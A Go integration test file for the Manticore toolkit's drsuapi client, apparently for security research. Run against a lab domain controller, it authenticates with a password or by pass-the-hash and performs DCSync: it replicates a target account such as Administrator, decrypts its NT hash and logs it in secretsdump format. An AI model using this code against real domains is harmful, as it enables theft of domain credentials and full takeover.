//go:build integration

package msdrsr_test

import (
	"os"
	"strconv"
	"testing"
	"time"

	"github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/e3514235-4b06-11d1-ab04-00c04fc2dcd2/4.0/structures"
	msdrsr "github.com/TheManticoreProject/Manticore/network/dcerpc/ms-protocols/ms-drsr"
	"github.com/TheManticoreProject/Manticore/windows/credentials"
)

// TestDRSBindUnbind exercises the full Phase 2 path against a live Domain Controller:
// endpoint-mapper resolution, ncacn_ip_tcp dial, NTLM packet-privacy auth, drsuapi bind,
// and the IDL_DRSBind / IDL_DRSUnbind handshake. It is skipped unless DRSUAPI_TEST_HOST
// is set.
//
//	DRSUAPI_TEST_HOST=10.0.0.10 DRSUAPI_TEST_DOMAIN=lab.local \
//	DRSUAPI_TEST_USER=Administrator DRSUAPI_TEST_PASS=... \
//	go test -tags integration ./network/dcerpc/ms-protocols/ms-drsr/
//
// Pass-the-hash: set DRSUAPI_TEST_HASHES=LM:NT (or :NT) instead of DRSUAPI_TEST_PASS.
// Skip endpoint-mapper resolution with DRSUAPI_TEST_PORT.
func TestDRSBindUnbind(t *testing.T) {
	host := os.Getenv("DRSUAPI_TEST_HOST")
	if host == "" {
		t.Skip("set DRSUAPI_TEST_HOST to run the drsuapi bind integration test")
	}
	creds, err := credentials.NewCredentials(
		os.Getenv("DRSUAPI_TEST_DOMAIN"),
		os.Getenv("DRSUAPI_TEST_USER"),
		os.Getenv("DRSUAPI_TEST_PASS"),
		os.Getenv("DRSUAPI_TEST_HASHES"),
	)
	if err != nil {
		t.Fatalf("build credentials: %v", err)
	}

	c := msdrsr.New(host, creds)
	c.SetTimeout(15 * time.Second)
	if p := os.Getenv("DRSUAPI_TEST_PORT"); p != "" {
		n, err := strconv.Atoi(p)
		if err != nil {
			t.Fatalf("invalid DRSUAPI_TEST_PORT %q: %v", p, err)
		}
		c.SetPort(n)
	}

	if err := c.Connect(); err != nil {
		t.Fatalf("Connect: %v", err)
	}
	defer c.Close()

	if c.Handle().IsNull() {
		t.Error("IDL_DRSBind returned a null context handle")
	}
	if len(c.SessionKey()) == 0 {
		t.Error("no NTLM session key after authenticated bind")
	}
	ext := c.ServerExtensions()
	if ext == nil {
		t.Fatal("server returned no DRS_EXTENSIONS")
	}
	t.Logf("server extensions: dwFlags=0x%08x dwFlagsExt=0x%08x dwReplEpoch=%d",
		ext.DwFlags, ext.DwFlagsExt, ext.DwReplEpoch)
	if ext.DwFlags&structures.DRS_EXT_STRONG_ENCRYPTION == 0 {
		t.Error("server did not negotiate STRONG_ENCRYPTION; secret replication would be refused")
	}
}

// TestCrackAndReplicate exercises the DCSync critical thread against a live DC: resolve a
// target account to its objectGUID with IDL_DRSCrackNames, then replicate that single
// object with IDL_DRSGetNCChanges (EXOP_REPL_OBJ) and decrypt its secrets. Requires
// DRSUAPI_TEST_HOST and a target: DRSUAPI_TEST_DN (a distinguished name, e.g.
// "CN=Administrator,CN=Users,DC=lab,DC=local"; recommended — no NetBIOS name needed) or
// DRSUAPI_TEST_TARGET (an NT4-format "DOMAIN\\user").
func TestCrackAndReplicate(t *testing.T) {
	host := os.Getenv("DRSUAPI_TEST_HOST")
	dn := os.Getenv("DRSUAPI_TEST_DN")
	target := os.Getenv("DRSUAPI_TEST_TARGET")
	if host == "" || (dn == "" && target == "") {
		t.Skip("set DRSUAPI_TEST_HOST and DRSUAPI_TEST_DN (or DRSUAPI_TEST_TARGET) to run")
	}
	creds, err := credentials.NewCredentials(
		os.Getenv("DRSUAPI_TEST_DOMAIN"), os.Getenv("DRSUAPI_TEST_USER"),
		os.Getenv("DRSUAPI_TEST_PASS"), os.Getenv("DRSUAPI_TEST_HASHES"),
	)
	if err != nil {
		t.Fatalf("build credentials: %v", err)
	}

	c := msdrsr.New(host, creds)
	c.SetTimeout(15 * time.Second)
	if err := c.Connect(); err != nil {
		t.Fatalf("Connect: %v", err)
	}
	defer c.Close()

	name, format := dn, structures.DS_FQDN_1779_NAME
	if name == "" {
		name, format = target, structures.DS_NT4_ACCOUNT_NAME
	}
	objGUID, err := c.ResolveToGUID(name, format)
	if err != nil {
		t.Fatalf("ResolveToGUID(%q): %v", name, err)
	}
	t.Logf("%s -> %s", name, objGUID.ToFormatD())

	res, err := c.ReplicateSingleObject(objGUID)
	if err != nil {
		t.Fatalf("ReplicateSingleObject: %v", err)
	}
	if len(res.Objects) == 0 {
		t.Fatal("no objects returned")
	}
	obj := res.Objects[0]
	t.Logf("replicated %s (%s) with %d attributes", obj.DN, obj.GUID.ToFormatD(), len(obj.Attributes))
	if len(obj.Attributes) == 0 {
		t.Error("object returned with no attributes")
	}

	secrets, err := c.DecryptSecrets(res)
	if err != nil {
		t.Fatalf("DecryptSecrets: %v", err)
	}
	if len(secrets) == 0 {
		t.Fatal("no secrets decrypted (object had no objectSid?)")
	}
	s := secrets[0]
	if !s.HasNT {
		t.Error("no NT hash decrypted for the target account")
	}
	// secretsdump-style line: sAMAccountName:RID:LMHash:NTHash:::
	t.Logf("%s:%d:%x:%x:::", s.SAMAccountName, s.RID, s.LMHash, s.NTHash)
}

// TestDomainControllerInfoAndDCSync exercises the Phase 5 workflow: IDL_DRSDomainController
// Info to enumerate DCs (and obtain the source DSA GUID), then the one-call DCSync helper.
// Requires DRSUAPI_TEST_HOST, DRSUAPI_TEST_DNSDOMAIN (e.g. "lab.local"), and a target via
// DRSUAPI_TEST_DN (recommended) or DRSUAPI_TEST_TARGET.
func TestDomainControllerInfoAndDCSync(t *testing.T) {
	host := os.Getenv("DRSUAPI_TEST_HOST")
	dnsDomain := os.Getenv("DRSUAPI_TEST_DNSDOMAIN")
	dn := os.Getenv("DRSUAPI_TEST_DN")
	if host == "" || dnsDomain == "" || dn == "" {
		t.Skip("set DRSUAPI_TEST_HOST, DRSUAPI_TEST_DNSDOMAIN and DRSUAPI_TEST_DN to run")
	}
	creds, err := credentials.NewCredentials(
		os.Getenv("DRSUAPI_TEST_DOMAIN"), os.Getenv("DRSUAPI_TEST_USER"),
		os.Getenv("DRSUAPI_TEST_PASS"), os.Getenv("DRSUAPI_TEST_HASHES"))
	if err != nil {
		t.Fatalf("build credentials: %v", err)
	}

	c := msdrsr.New(host, creds)
	c.SetTimeout(15 * time.Second)
	if err := c.Connect(); err != nil {
		t.Fatalf("Connect: %v", err)
	}
	defer c.Close()

	dcs, err := c.DomainControllerInfo(dnsDomain)
	if err != nil {
		t.Fatalf("DomainControllerInfo: %v", err)
	}
	if len(dcs) == 0 {
		t.Fatal("no DCs returned")
	}
	for _, dc := range dcs {
		t.Logf("DC %s (%s) site=%s ntdsDsaGuid=%s pdc=%v gc=%v",
			dc.NetbiosName, dc.DNSHostName, dc.SiteName, dc.NtdsDsaObjectGuid.ToFormatD(), dc.IsPDC, dc.IsGC)
	}
	// Use the first DC's DSA GUID as the replication source (robustness path).
	c.SetSourceDSA(dcs[0].NtdsDsaObjectGuid)

	sec, err := c.DCSyncByDN(dn)
	if err != nil {
		t.Fatalf("DCSyncByDN: %v", err)
	}
	if !sec.HasNT {
		t.Error("DCSync returned no NT hash")
	}
	t.Logf("%s:%d:%x:%x:::", sec.SAMAccountName, sec.RID, sec.LMHash, sec.NTHash)
}
